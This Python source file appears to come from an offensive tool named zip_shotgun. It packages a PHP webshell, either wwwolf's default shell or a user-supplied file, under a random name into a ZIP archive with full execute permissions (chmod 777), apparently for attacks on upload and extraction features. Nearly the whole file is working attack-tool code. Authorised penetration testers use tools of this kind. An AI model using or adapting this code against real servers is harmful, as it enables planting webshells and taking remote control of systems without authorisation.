import logging
import pathlib
import string
from random import SystemRandom
from typing import Tuple
from zipfile import ZipFile, ZIP_DEFLATED, ZipInfo

from typeguard import typechecked

from zip_shotgun.shells.wwwolf_php_webshell import get_wwwolf_php_webshell_code


@typechecked(always=True)
def get_random_shell_name(name_length: int) -> str:
    # Generate random name using ASCII letters and digits
    random_shell_name = ''.join(SystemRandom().choices(string.ascii_letters + string.digits, k=name_length))
    logging.warning(f'Shell name was not provided. Generated random shell name: {random_shell_name}')
    return random_shell_name


@typechecked(always=True)
def get_default_shell_code_and_extension() -> Tuple[str, str]:
    logging.warning('Shell file was not provided. Using default wwwolf\'s webshell code')
    default_shell_code = get_wwwolf_php_webshell_code()

    # Use default file extension for wwwolf's webshell
    default_file_extension = 'php'
    logging.info(f'Using default file extension for wwwolf\'s webshell: {default_file_extension}')

    return default_shell_code, default_file_extension


@typechecked(always=True)
def get_user_provided_shell_code_and_extension(provided_shell_file_path: str) -> Tuple[str, str]:
    logging.info(f'File containing shell code was provided: {provided_shell_file_path}. Content will be added to archive')

    # Get file extension from user provided shell file
    user_provided_file_extension = pathlib.Path(provided_shell_file_path).suffix
    stripped_user_provided_file_extension = user_provided_file_extension.lstrip('.')  # Delete "." character from extension. It will be added later
    logging.info(f'Getting file extension from provided shell file for reuse: {stripped_user_provided_file_extension}')

    logging.info(f'Opening provided file with shell code: {provided_shell_file_path}')
    with open(provided_shell_file_path) as provided_shell_file:
        user_provided_shell_code = provided_shell_file.read()

    return user_provided_shell_code, stripped_user_provided_file_extension


@typechecked(always=True)
def save_file_to_zip_archive(output_zip_file: ZipFile, file_name_with_extension: str, shell_code_to_write: str, use_compression: bool) -> None:
    logging.info(f'Writing file to the archive: {file_name_with_extension}')
    logging.info(f'Setting full read/write/execute permissions (chmod 777) for file: {file_name_with_extension}')
    zip_info = ZipInfo(file_name_with_extension)
    zip_info.external_attr = 0o777 << 16  # Set permissions - chmod 777
    if use_compression:
        output_zip_file.writestr(zip_info, shell_code_to_write, ZIP_DEFLATED, 9)
    else:  # If --compress flag was not provided only store the files in the archive.
        output_zip_file.writestr(zip_info, shell_code_to_write)
